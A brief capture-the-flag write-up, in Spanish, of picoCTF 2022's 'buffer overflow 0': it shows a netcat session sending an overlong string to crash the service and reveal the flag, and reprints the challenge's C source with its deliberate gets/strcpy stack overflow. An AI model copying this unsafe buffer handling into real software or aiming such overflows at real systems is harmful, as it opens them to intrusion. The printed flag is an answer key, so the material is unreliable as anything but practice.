# buffer overflow 0
---
## Objectivo
Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/521/vuln). You can view source [here](https://artifacts.picoctf.net/c/521/vuln.c). And connect with it using:`nc saturn.picoctf.net 65355`

---
## Solución

``` sh
angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/descargablesCTF/picoCTF2022/ReverseEngineering$ nc saturn.picoctf.net 65355
Input: laksjdflajsdlkfjasljflasdjflaskdjflkajsdlfkjadskljflaskdjfklsjadfklajdsflkjsadlkfj
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/descargablesCTF/picoCTF2022/ReverseEngineering$ cat vuln.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}


```

### `picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}

---
## Notas adicionales


---
## Referencias

	